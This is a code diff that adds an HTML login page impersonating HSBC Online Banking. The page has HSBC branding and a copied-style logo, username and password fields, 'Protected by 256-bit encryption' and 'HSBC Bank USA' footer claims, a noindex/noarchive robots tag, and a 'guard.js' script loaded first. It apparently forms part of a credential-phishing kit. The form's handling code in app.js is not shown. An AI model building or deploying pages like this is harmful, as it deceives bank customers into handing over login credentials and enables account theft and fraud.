@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="robots" content="noindex, nofollow, noarchive" />
+  <script src="js/guard.js?v=1"></script>
+  <title>HSBC | Log on</title>
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <meta name="theme-color" content="#e31b24" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/styles.css?v=7" />
+</head>
+<body>
+  <div class="app">
+    <div class="page hsbc-auth">
+      <header class="hsbc-bar">
+        <a class="hsbc-bar-brand" href="index.html" aria-label="HSBC home">
+          <svg width="28" height="28" viewBox="0 0 64 64" aria-hidden="true">
+            <polygon fill="#fff" points="32,3 59,18.5 59,45.5 32,61 5,45.5 5,18.5"/>
+            <polygon fill="#e31b24" points="32,16 46,24 46,40 32,48 18,40 18,24"/>
+            <polygon fill="#fff" points="32,24 39,28 39,36 32,40 25,36 25,28"/>
+          </svg>
+          <span>HSBC</span>
+        </a>
+      </header>
+
+      <main class="hsbc-login" id="main">
+        <form id="loginForm" class="hsbc-card" novalidate>
+          <h1>Log on to Online Banking</h1>
+          <p class="hsbc-lead">Mediterranean Investment Capital Ltd</p>
+
+          <div class="hsbc-field">
+            <label for="loginUser">Username</label>
+            <input id="loginUser" name="username" autocomplete="username" required placeholder="Enter your username" />
+            <a class="hsbc-link" href="forgot.html">Forgotten your username?</a>
+          </div>
+
+          <div class="hsbc-field">
+            <label for="loginPass">Password</label>
+            <div class="hsbc-pass">
+              <input id="loginPass" name="password" type="password" autocomplete="current-password" required placeholder="Enter your password" />
+              <button class="icon-quiet" type="button" id="togglePass" aria-label="Show password">
+                <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24" aria-hidden="true">
+                  <path d="M2.06 12.35a1 1 0 0 1 0-.7 10.75 10.75 0 0 1 19.88 0 1 1 0 0 1 0 .7 10.75 10.75 0 0 1-19.88 0"/>
+                  <circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+            <a class="hsbc-link" href="forgot.html">Forgotten your password?</a>
+          </div>
+
+          <label class="hsbc-check"><input type="checkbox" id="rememberMe" /> Remember username</label>
+          <p class="auth-error" id="loginError">Enter a username and password to continue.</p>
+          <button class="hsbc-btn" type="submit" disabled>Log on</button>
+        </form>
+      </main>
+
+      <footer class="hsbc-foot">
+        <span>HSBC Bank USA</span>
+        <span>Protected by 256-bit encryption</span>
+      </footer>
+    </div>
+  </div>
+  <script src="js/app.js?v=9"></script>
+</body>
+</html>
